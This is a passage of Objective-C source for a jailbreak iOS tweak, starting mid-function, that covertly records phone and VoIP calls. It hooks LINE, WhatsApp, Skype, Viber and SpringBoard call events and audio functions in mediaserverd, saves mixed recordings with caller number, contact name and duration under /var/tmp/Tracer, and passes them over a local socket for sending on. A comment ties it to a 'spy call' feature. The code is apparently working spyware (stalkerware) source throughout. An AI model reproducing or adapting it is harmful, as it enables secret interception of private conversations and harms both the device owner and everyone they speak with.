                [urlRequest setHTTPBody:[NSJSONSerialization dataWithJSONObject:[NSDictionary dictionaryWithObjectsAndKeys:@"stop", @"cmd", nil] options:nil error:NULL]];
                
                NSURLResponse * response = nil;
                NSError * error = nil;
                NSData * data = [NSURLConnection sendSynchronousRequest:urlRequest returningResponse:&response error:&error];
                NSLog(@">>> Tracer %@", [[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] autorelease]);
            }
            else
            {
                id messagingCenter = [objc_getClass("CPDistributedMessagingCenter") centerNamed:@"com.timecompiler.recorder"];
                NSDictionary *dic = [messagingCenter sendMessageAndReceiveReplyName:@"call" userInfo:[NSDictionary dictionaryWithObjectsAndKeys:@"stop", @"cmd", nil]];
            }
        }
    }
}

%end

%end

#pragma mark - LINE -
%group LINE_group

%hook NCVoIPFreeCallViewController

- (void) VoIPSessionStateDidChange: (id) arg1 state: (int) arg2 {
    %orig;
    
    //NSLog(@"VoIPSession: %@", arg1);
    NSLog(@"state: %d", arg2);
    
    NSString *phone = [(AMPUserInfo *)[arg1 userInfo] name];
    NSString *direction = @"outgoing";
    if ([(NCVoIPSession *)arg1 callDirection] == 1) {
        direction = @"incoming";
    }
    
    UILabel *profileNameLable = [self profileNameLabel];
    NSString *phoneName = profileNameLable.text;
    
    NSLog(@"phone: %@", phone);
    NSLog(@"direction: %@", direction);
    NSLog(@"phoneName: %@", phoneName);
    
    int state = arg2;
    
    if (state == 5) {
        NSMutableURLRequest * urlRequest = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://127.0.0.1:30301/start"]];
        [urlRequest setHTTPMethod:@"POST"];
        [urlRequest setHTTPBody:[NSJSONSerialization dataWithJSONObject:[NSDictionary dictionaryWithObjectsAndKeys:@"start", @"cmd", @"line", @"app", phone, @"number", phoneName, @"phoneName", direction, @"direction", nil] options:nil error:NULL]];
        NSURLResponse * response = nil;
        NSError * error = nil;
        NSData * data = [NSURLConnection sendSynchronousRequest:urlRequest returningResponse:&response error:&error];
        NSLog(@">>> Tracer %@", [[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] autorelease]);
    }
    else if (state == 6 || state == 7) {
        NSMutableURLRequest * urlRequest = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://127.0.0.1:30301/start"]];
        [urlRequest setHTTPMethod:@"POST"];
        [urlRequest setHTTPBody:[NSJSONSerialization dataWithJSONObject:[NSDictionary dictionaryWithObjectsAndKeys:@"stop", @"cmd", nil] options:nil error:NULL]];
        
        NSURLResponse * response = nil;
        NSError * error = nil;
        NSData * data = [NSURLConnection sendSynchronousRequest:urlRequest returningResponse:&response error:&error];
        NSLog(@">>> Tracer %@", [[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] autorelease]);
    }
}

%end

%end

/**** End of Whatsapp ****/
#pragma mark - SpringBoard -
/*** Springboard - use for demo only ***/
static int i_direction = CALL_IN;
static void callback(CFNotificationCenterRef center, void *observer, CFStringRef name, const void *object, CFDictionaryRef userInfo)

{
    NSString *notifyname=(NSString *)name;
    //NSLog(@"--==> %@ %@", notifyname, userInfo);
    if ([notifyname isEqualToString:@"kCTCallStatusChangeNotification"] ||
        [notifyname isEqualToString:@"kInternalCTCallStatusChangeNotification"])
    {
        NSDictionary *info = (NSDictionary *)userInfo;
        CTCall *call = (CTCall *)[info objectForKey:@"kCTCall"];
        int status = [[info objectForKey:@"kCTCallStatus"] intValue];
        
        switch (status) {
            case CALL_IN:
            {
                i_direction = CALL_IN;
            }
                break;
            case CALL_OUT:
            {
                i_direction = CALL_OUT;
            }
                break;
            case CALL_CONNECTED:
            {
                if (PHONE_CALL_RECORDING)
                {
                    NSString *phone = CTCallCopyAddress(NULL, call);
                    if (phone == nil) {
                        phone = @"";
                    }
                    BOOL skip = NO;
                    if (skip == NO) {
                        
                        NSString *call_direction = @"outgoing";
                        
                        if (i_direction == CALL_IN) {
                            call_direction = @"incoming";
                        }
                        
                        NSLog(@"----> START RECORDING %@", call_direction);
                        
                        if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"7.0")) {
                            NSLog(@"===> >= 7.0.0");
                            NSMutableURLRequest * urlRequest = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://127.0.0.1:30301/start"]];
                            [urlRequest setHTTPMethod:@"POST"];
                            [urlRequest setHTTPBody:[NSJSONSerialization dataWithJSONObject:[NSDictionary dictionaryWithObjectsAndKeys:@"start", @"cmd", phone, @"number", call_direction, @"direction", nil] options:nil error:NULL]];
                            NSURLResponse * response = nil;
                            NSError * error = nil;
                            NSData * data = [NSURLConnection sendSynchronousRequest:urlRequest returningResponse:&response error:&error];
                            NSLog(@">>> Tracer %@", [[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] autorelease]);
                        }
                        else {
                            NSLog(@"===> <= 7.0.0");
                            id messagingCenter = [objc_getClass("CPDistributedMessagingCenter") centerNamed:@"com.timecompiler.recorder"];
                            NSDictionary *dic = [messagingCenter sendMessageAndReceiveReplyName:@"call" userInfo:[NSDictionary dictionaryWithObjectsAndKeys:@"start", @"cmd", phone, @"number", call_direction, @"direction", nil]];
                        }
                    }
                }
            }
                break;
            case CALL_DISCONNECTED:
            {
                if (PHONE_CALL_RECORDING)
                {
                    NSString *phone = CTCallCopyAddress(NULL, call);
                    if (phone == nil) {
                        phone = @"";
                    }
                    BOOL skip = NO;
                    if (skip == NO) {
                        NSLog(@"----> STOP RECORDING");
                        
                        if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"7.0")) {
                            NSMutableURLRequest * urlRequest = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://127.0.0.1:30301/start"]];
                            [urlRequest setHTTPMethod:@"POST"];
                            [urlRequest setHTTPBody:[NSJSONSerialization dataWithJSONObject:[NSDictionary dictionaryWithObjectsAndKeys:@"stop", @"cmd", nil] options:nil error:NULL]];
                            NSURLResponse * response = nil;
                            NSError * error = nil;
                            NSData * data = [NSURLConnection sendSynchronousRequest:urlRequest returningResponse:&response error:&error];
                            NSLog(@">>> Tracer %@", [[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] autorelease]);
                        }
                        else
                        {
                            id messagingCenter = [objc_getClass("CPDistributedMessagingCenter") centerNamed:@"com.timecompiler.recorder"];
                            
                            NSDictionary *dic = [messagingCenter sendMessageAndReceiveReplyName:@"call" userInfo:[NSDictionary dictionaryWithObjectsAndKeys:@"stop", @"cmd", nil]];
                        }
                    }
                }
            }
                break;
                
            default:
                break;
        }
        
        return;
    }
}


%group Springboard_group
%hook SpringBoard

- (void)applicationDidFinishLaunching:(id)application
{
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        //if ([[[UIDevice currentDevice] systemVersion] integerValue] >= 9) {
            // Call record a lone
            //id ct = CTTelephonyCenterGetDefault();
            //CTTelephonyCenterAddObserver(ct,NULL,callback, CFSTR("kCTCallStatusChangeNotification"), NULL, CFNotificationSuspensionBehaviorDeliverImmediately);
        //} else {
            // Call record works cooperatively with spy call
            CFNotificationCenterRef ct = CFNotificationCenterGetLocalCenter();
            CFNotificationCenterAddObserver(ct,nil,callback,CFSTR("kInternalCTCallStatusChangeNotification"),nil,CFNotificationSuspensionBehaviorDeliverImmediately);
        //}
    });
    %orig;
}

%end
%end

/*** End of SpringBoard ***/
#pragma mark - HTTP server -
/**** Init function ****/
__attribute__((constructor))
static void initialize() {
    const char *name = getprogname();
    if (name != NULL && strcmp(name, "mediaserverd") == 0)
    {
        Dispatch_AfterDelay_ToMainThread(2.0, ^{
            struct utsname systemInfo;
            uname(&systemInfo);
            iMode = 1;
            
            MS_SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO_IOS9 = SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"9.0");
            NSLog(@"===> Loaded (iOS9 = %d) <===", MS_SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO_IOS9);
            
            
            NSString *machine = [NSString stringWithFormat:@"%s", systemInfo.machine];
            //MSHookFunction((void *)AudioUnitRender, (void *)r_AudioUnitRender, (void **)&o_AudioUnitRender);
            MSHookFunction((void *)AudioUnitProcess, (void *)r_AudioUnitProcess, (void **)&o_AudioUnitProcess);
            MSHookFunction((void *)AudioConverterDispose, (void *)r_AudioConverterDispose, (void **)&o_AudioConverterDispose);
            MSHookFunction((void *)AudioConverterConvertComplexBuffer, (void *)r_AudioConverterConvertComplexBuffer, (void **)&o_AudioConverterConvertComplexBuffer);
            MSHookFunction((void *)AudioConverterNew, (void *)r_AudioConverterNew, (void **)&o_AudioConverterNew);
            MSHookFunction((void *)AudioConverterConvertBuffer, (void *)r_AudioConverterConvertBuffer, (void **)&o_AudioConverterConvertBuffer);
            //MSHookFunction((void *)AudioUnitSetProperty, (void *)r_AudioUnitSetProperty, (void **)&o_AudioUnitSetProperty);
            
            SoundRecorderInstance = [[SoundRecorder alloc] init];
            if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"7.0")) {
                HTTPServer *http = [HTTPServer defaultServer];
                [http handlePOST:@"/start" with:^(HTTPConnection *connection) {
                    NSData *data = [connection requestBodyData];
                    NSDictionary *userInfo = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableContainers error:NULL];
                    NSLog(@">>* %@ %@", [connection requestBody], userInfo);
                    NSDictionary *rd = [(SoundRecorder *)SoundRecorderInstance handleMessageNamed:@"call" withUserInfo:userInfo];
                    if (rd != nil) {
                        return [[[NSString alloc] initWithData:[NSJSONSerialization dataWithJSONObject:rd options:0 error:NULL] encoding:NSUTF8StringEncoding] autorelease];
                    }
                    return @"";
                }];
                [http handlePOST:@"/stop" with:^(HTTPConnection *connection) {
                    NSData *data = [connection requestBodyData];
                    NSDictionary *userInfo = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableContainers error:NULL];
                    NSLog(@">>* %@ %@", [connection requestBody], userInfo);
                    NSDictionary *rd = [(SoundRecorder *)SoundRecorderInstance handleMessageNamed:@"call" withUserInfo:userInfo];
                    if (rd != nil) {
                        return [[[NSString alloc] initWithData:[NSJSONSerialization dataWithJSONObject:rd options:0 error:NULL] encoding:NSUTF8StringEncoding] autorelease];
                    }
                    return @"";
                }];
                [http listenOnPort:30301 onError:^(id reason) {
                    NSLog(@"Error starting server: %s", [reason UTF8String]);
                }];
            }
            else {
                id messagingCenter = [objc_getClass("CPDistributedMessagingCenter") centerNamed:@"com.timecompiler.recorder"];
                [messagingCenter runServerOnCurrentThread];
                [messagingCenter registerForMessageName:@"call" target:SoundRecorderInstance selector:@selector(handleMessageNamed:withUserInfo:)];
            }
            
        });
    }
    else {
        if ((name != NULL && (strcmp(name, "Viber") == 0) || strcmp(name, "WhatsApp") == 0 || strcmp(name, "Skype") == 0 || strcmp(name, "LINE") == 0))
        {
            iMode = 1;
        }
    }
}

%ctor {
    const char *name = getprogname();
    if (name != NULL && strcmp(name, "SpringBoard") == 0)
    {
        %init(Springboard_group);
    }
    else if (name != NULL && strcmp(name, "Skype") == 0)
    {
        %init(Skype_group);
    }
    else if (name != NULL && strcmp(name, "WhatsApp") == 0)
    {
        %init(WhatsApp_group);
    }
    else if (name != NULL && strcmp(name, "Viber") == 0)
    {
        %init(Viber_group);
    }
    else if (name != NULL && strcmp(name, "LINE") == 0)
    {
        %init(LINE_group);
    }
    else {
        NSLog(@"===> Name: %s", name);
    }
    %init(_ungrouped);
}

/**** End of Init function ****/

#pragma mark - Process sound packet & save & send -

bool sendCallRecordInfo(NSDictionary *callRecordInfo) {
    NSLog(@"===> callRecordInfo: %@", callRecordInfo);
    bool sendSuccess = false;
    NSData *rawData = [NSKeyedArchiver archivedDataWithRootObject:callRecordInfo];
    CFDataRef data = (CFDataRef) rawData;
    
    CFSocketContext socketContext;
    socketContext.version = 1984;
    socketContext.info = NULL;
    socketContext.retain = NULL;
    socketContext.release = NULL;
    socketContext.copyDescription = NULL;
    
    // Creating socket
    CFSocketRef socketRef = CFSocketCreate(kCFAllocatorDefault, PF_INET, SOCK_DGRAM, IPPROTO_UDP, kCFSocketNoCallBack, NULL, &socketContext);
    if (socketRef) {
        // Configuring socket
        CFSocketSetSocketFlags(socketRef, kCFSocketCloseOnInvalidate);
        
        NSInteger opYES = 1;
        NSInteger error = setsockopt(CFSocketGetNative(socketRef), SOL_SOCKET, SO_REUSEADDR, (const void*)&opYES, sizeof(NSInteger));
        if (!error) {
            // Binding socket address
            struct sockaddr_in addr;
            memset(&addr, 0, sizeof(addr));
            addr.sin_len = sizeof(addr);
            addr.sin_family = AF_INET;
            addr.sin_port = htons(30302);
            addr.sin_addr.s_addr = inet_addr("127.0.0.1");
            
            NSData* address = [NSData dataWithBytes:&addr length: sizeof(addr)];
            CFDataRef cfAddress = CFDataCreate(kCFAllocatorDefault, (const UInt8*)[address bytes], [address length]);
            CFSocketError socketError = CFSocketConnectToAddress(socketRef, cfAddress, 2); // 2 seconds
            CFRelease(cfAddress);
            if (socketError == kCFSocketSuccess) {
                socketError = CFSocketSendData(socketRef, NULL, data, 0);
                if (socketError != kCFSocketSuccess) {
                    NSLog(@"Sending data error: %ld", (signed long)socketError);
                } else {
                    sendSuccess = true;
                    NSLog(@"---> Sending data <OK>");
                }
            } else {
                NSLog(@"Binding socket address error: %ld", (long)socketError);
            }
        } else {
            NSLog(@"Configuring socket option error: %ld", (long)error);
        }
    } else {
        NSLog(@"Cannot create socket");
    }
    
    if (socketRef) {
        CFSocketInvalidate(socketRef);
        CFRelease(socketRef);
    }
    
    return sendSuccess;
}

/**** Process sound packet & save ****/
void new_process_packet(ppacket *packet)
{
    //NSLog(@"packet->type: %d", packet->type);
    switch (packet->type) {
        case 100:
        {
            /* Start recording */
            
            srand(time(NULL));
            session_id = rand();
            
            start_time = -1;
            
            for (int i=0; i < MAXFILE; i++) {
                streams[i].fd = INVALID_FILE;
                streams[i].identifier = 0;
                streams[i].start_time = 0;
                streams[i].converter = NULL;
            }
        }
            break;
        case 101:
        {
            /* Stop recording */
            
            duration = (CFAbsoluteTimeGetCurrent() - start_time)*1000;
            
            NSMutableArray *files = [[NSMutableArray alloc] init];
            NSMutableArray *times = [[NSMutableArray alloc] init];
            
            for (int i=0; i < MAXFILE; i++) {
                if (streams[i].fd != INVALID_FILE) {
                    
                    NSLog(@"---> File[%x]:%d", streams[i].identifier, streams[i].start_time);
                    
                    [files addObject:[NSString stringWithFormat:@"/var/tmp/Tracer/%d#%d#%s#%s.wav", session_id, streams[i].identifier, phone, app]];
                    [times addObject:[NSNumber numberWithInt:streams[i].start_time]];
                    
                    //AudioConverterDispose(streams[i].converter);
                    
                    streams[i].fd = INVALID_FILE;
                    streams[i].identifier = 0;
                    streams[i].start_time = 0;
                    streams[i].converter = NULL;
                    // ----------------------------------------------------------------------------------------------------------------------
                    ExtAudioFileDispose(streams[i].test);
                    // ----------------------------------------------------------------------------------------------------------------------
                }
            }
            
            if ([[NSFileManager defaultManager] fileExistsAtPath:@"/var/tmp/Tracer/file_tmp.wav"]) {
                [files addObject:@"/var/tmp/Tracer/file_tmp.wav"];
                [times addObject:[NSNumber numberWithInt:0]];
            }
            
            NSString *mixURL = [NSString stringWithFormat:@"/var/tmp/Tracer/%d-%s-%s.wav", session_id, phone, app];
            if ([files count] == 1) {
                NSLog(@"1-side recording");
                [[NSFileManager defaultManager] moveItemAtPath:files[0] toPath:mixURL error:NULL];
                convertFile(mixURL, [NSString stringWithFormat:@"/var/tmp/Tracer/%d-%s-%s-%d.mp3", session_id, phone, app, duration/1000]);
            }
            else if ([files count] > 1) {
                NSLog(@"Mix sound files (%@)", times);
                [PCMMixer mixFiles:files atTimes:times toMixfile:mixURL duration:&duration];
                convertFile(mixURL, [NSString stringWithFormat:@"/var/tmp/Tracer/%d-%s-%s-%d.mp3", session_id, phone, app, duration/1000]);
            }
            else {
                NSLog(@" *** Unknown error *** ");
            }
            
            /**** uncomment here *****/
            
            for (int i=0; i < [files count]; i++) {
                unlink([[files objectAtIndex:i] cStringUsingEncoding:1]);
            }
            unlink([mixURL cStringUsingEncoding:1]);
            
            /**** ***/
            
            
            NSMutableArray *news_arrays = [[[NSMutableArray alloc] initWithContentsOfFile:@"/var/tmp/Tracer/list.plist"] autorelease];
            if (news_arrays == nil) {
                news_arrays = [[[NSMutableArray alloc] init] autorelease];
            }
            int stt= (int)(start_time) + delta;
            NSDictionary *dic = [NSDictionary dictionaryWithObjectsAndKeys:[NSString stringWithFormat:@"/var/tmp/Tracer/%d-%s-%s-%d.mp3", session_id, phone, app, duration/1000], @"name", [NSString stringWithFormat:@"%s", app], @"app", [NSString stringWithFormat:@"%s", phone], @"number", [NSString stringWithFormat:@"%d", duration/1000], @"duration", [NSString stringWithFormat:@"%d", stt], @"time", [NSString stringWithFormat:@"%s", direction], @"direction", nil];
            [news_arrays addObject:dic];
            [news_arrays writeToFile:@"/var/tmp/Tracer/list.plist" atomically:YES];
            
            if ([files count]) {
                NSLog(@"Sending record file to server...");
                NSMutableDictionary *callRecordInfo = [NSMutableDictionary dictionary];
                [callRecordInfo setObject:[NSString stringWithFormat:@"/var/tmp/Tracer/%d-%s-%s-%d.mp3", session_id, phone, app, duration/1000] forKey:@"mixFilePath"];
                [callRecordInfo setObject:[NSString stringWithFormat:@"%s", app] forKey:@"app"];
                [callRecordInfo setObject:[NSNumber numberWithInt:session_id] forKey:@"session_id"];
                [callRecordInfo setObject:[NSString stringWithFormat:@"%s", phone] forKey:@"phone"];
                if (app != NULL && strcmp(app, "line") == 0) {
                    NSString *phoneName = [NSString stringWithUTF8String:phone_name];
                    if (phoneName) {
                        [callRecordInfo setObject:phoneName forKey:@"phone"];
                    }
                }
                [callRecordInfo setObject:[NSNumber numberWithInt:duration/1000] forKey:@"duration"];
                [callRecordInfo setObject:[NSString stringWithFormat:@"%s", direction] forKey:@"direction"];
                bool sendSuccess = sendCallRecordInfo(callRecordInfo);
                if (!sendSuccess) {
                    // Delete file
                    NSError *error = nil;
                    NSFileManager *fileManager = [NSFileManager defaultManager];
                    [fileManager removeItemAtPath:[callRecordInfo objectForKey:@"mixFilePath"] error:&error];
                    NSLog(@"Delete record file error, %@", error);
                }
            }
        }
            break;
        case 200:
        {
            /* open stream */
            for (int i=0; i < MAXFILE; i++) {
                if (streams[i].fd == INVALID_FILE) {
                    int code = packet->code;
                    
                    mkdir("/var/tmp/Tracer/", 0777);
                    
                    UInt64 timestamp = 0;
                    memcpy(&timestamp, packet->data, sizeof(UInt64));
                    
                    NSLog(@"timestamp: %lld", timestamp);
                    
                    streams[i].fd = i+1;
                    streams[i].identifier = code;
                    memcpy(&streams[i].desc, packet->data + sizeof(UInt64), sizeof(AudioStreamBasicDescription));
                    
                    if (start_time > 0) {
                        streams[i].start_time = ((timestamp*1.0)/1000.0f - start_time)*1000;
                    }
                    else {
                        start_time = (timestamp*1.0)/1000.0f;
                        streams[i].start_time = 0;
                    }
                    
                    NSLog(@"-----> STREAM[SR:%lf][FID:0x%x][FF:0x%x][BPP:%d][FPP:%d][BPF:%d][CPF:%d][BPC:%d][%@]", streams[i].desc.mSampleRate, streams[i].desc.mFormatID, streams[i].desc.mFormatFlags, streams[i].desc.mBytesPerPacket, streams[i].desc.mFramesPerPacket, streams[i].desc.mBytesPerFrame, streams[i].desc.mChannelsPerFrame, streams[i].desc.mBitsPerChannel,[NSString stringWithFormat:@"/var/tmp/Tracer/%d#%d#%s#%s.wav", session_id, code, phone, app]);
                    
                    AudioStreamBasicDescription audioFormat;
                    audioFormat.mSampleRate			= 8000.0;
                    audioFormat.mFormatID			= kAudioFormatLinearPCM;
                    audioFormat.mFormatFlags		= kAudioFormatFlagIsPacked | kAudioFormatFlagIsSignedInteger;
                    audioFormat.mFramesPerPacket	= 1;
                    audioFormat.mChannelsPerFrame	= 1;
                    audioFormat.mBitsPerChannel		= 16;
                    audioFormat.mBytesPerPacket		= 2;
                    audioFormat.mBytesPerFrame		= 2;
                    
                    //                    OSStatus status = AudioConverterNew (desc,&audioFormat,&(streams[i].converter));
                    //                    NSLog(@"-----> Create converter: %d", status);
                    
                    // --------------------------------- Test -------------------------------------------------------------------------------
                    CFURLRef url = CFURLCreateWithFileSystemPath(kCFAllocatorDefault,(CFStringRef)[NSString stringWithFormat:@"/var/tmp/Tracer/%d#%d#%s#%s.wav", session_id, code, phone, app], kCFURLPOSIXPathStyle, false);
                    
                    OSStatus status = ExtAudioFileCreateWithURL(url, kAudioFileWAVEType, &audioFormat, NULL, kAudioFileFlags_EraseFile, &(streams[i].test));
                    status = ExtAudioFileSetProperty (streams[i].test, kExtAudioFileProperty_ClientDataFormat, sizeof(streams[i].desc), &(streams[i].desc));
                    
                    CFRelease(url);
                    NSLog(@"-----> Create test: %d", status);
                    // ----------------------------------------------------------------------------------------------------------------------
                    break;
                }
            }
        }
            break;
        case 201:
        {
            /* Write buffer (special packet) */
            int code = packet->code;
            for (int i=0; i < MAXFILE; i++) {
                if (streams[i].identifier == code) {
                    
                    AudioBufferList outputBufferList;
                    outputBufferList.mNumberBuffers = 1;
                    outputBufferList.mBuffers[0].mNumberChannels = *((UInt32 *)(packet->data));
                    outputBufferList.mBuffers[0].mDataByteSize = packet->size-4*sizeof(UInt32);
                    outputBufferList.mBuffers[0].mData = (unsigned char *)packet->data + sizeof(UInt32);
                    ExtAudioFileWriteAsync (streams[i].test, outputBufferList.mBuffers[0].mDataByteSize/streams[i].desc.mBytesPerFrame, (const AudioBufferList *)(&outputBufferList));
                    
                    break;
                }
            }
        }
            break;
        case 203:
        {
            /* Write buffer (special packet) */
            int code = packet->code;
            for (int i=0; i < MAXFILE; i++) {
                if (streams[i].identifier == code) {
                    
                    NSLog(@"REC 203");
                    
                    int inNumberFrames = 0;
                    memcpy(&inNumberFrames, packet->data, sizeof(UInt32));
                    int inNumberBuffers = 0;
                    memcpy(&inNumberBuffers, packet->data+sizeof(UInt32), sizeof(UInt32));
                    const unsigned char *pp = packet->data + sizeof(UInt32) * 2;
                    
                    //                    int inNumberFrames = *((int *)(packet->data));
                    //                    int inNumberBuffers = *((int *)(packet->data) + 1);
                    //                    const unsigned char *pp = packet->data + sizeof(int) * 2;
                    
                    AudioBufferList outputBufferList;
                    outputBufferList.mNumberBuffers = inNumberBuffers;
                    for (int j=0; j < inNumberBuffers; j++) {
                        outputBufferList.mBuffers[j].mDataByteSize = *((UInt32 *)(pp));
                        outputBufferList.mBuffers[j].mNumberChannels = *((UInt32 *)(pp) + 1);
                        outputBufferList.mBuffers[j].mData = (void *)(pp + sizeof(UInt32)*2);
                        pp = pp + sizeof(UInt32)*2 + outputBufferList.mBuffers[j].mDataByteSize;
                    }
                    ExtAudioFileWriteAsync (streams[i].test, inNumberFrames, (const AudioBufferList *)(&outputBufferList));
                    
                    break;
                }
            }
        }
            break;
        case 202:
        {
            /* close stream */
        }
            break;
            
        case 300:
        {
            /* update phone number */
            memset(phone, 0, 50);
            memcpy(phone, (const char *)(packet->data), packet->size-3*sizeof(UInt32));
        }
            break;
            
        case 301:
        {
            /* update app name */
            memset(app, 0, 50);
            memcpy(app, (const char *)(packet->data), packet->size-3*sizeof(UInt32));
        }
            break;
            
        case 302:
        {
            /* update direction */
            memset(direction, 0, 50);
            memcpy(direction, (const char *)(packet->data), packet->size-3*sizeof(UInt32));
        }
            break;
            
        case 400:
        {
            /* update phone name */
            memset(phone_name, 0, 500);
            memcpy(phone_name, (const char *)(packet->data), packet->size-3*sizeof(UInt32));
        }
            break;
            
        default:
            break;
    }
    
}
/**** End of Process sound packets & save ****/

#pragma mark - Dynamic array -
/*** Dynamic array ****/
dyna *dyna_init()
{
    dyna *array;
    
    array = (dyna *)malloc(sizeof(dyna));
    
    array->last = 0;
    array->size = 1;
    array->data = (void **)calloc(array->size, sizeof(void *));
    array->data[0] = NULL;
    return array;
}

void dyna_resize(dyna *array, int size)
{
    array->size = size;
    array->data = (void **)realloc(array->data, size * sizeof(void *));
}

void * dyna_get(dyna *array, int index)
{
    return array->data[index];
}

void dyna_delete(dyna *array, int index)
{
    for (int i=index + 1; i < array->size; i++) {
        array->data[i-1] = array->data[i];
    }
    array->size -= 1;
}

void dyna_push(dyna *array, void *value)
{
    dyna_resize(array, array->size + 1);
    array->data[array->size-1] = value;
}
/*** End of dynamic array ***/
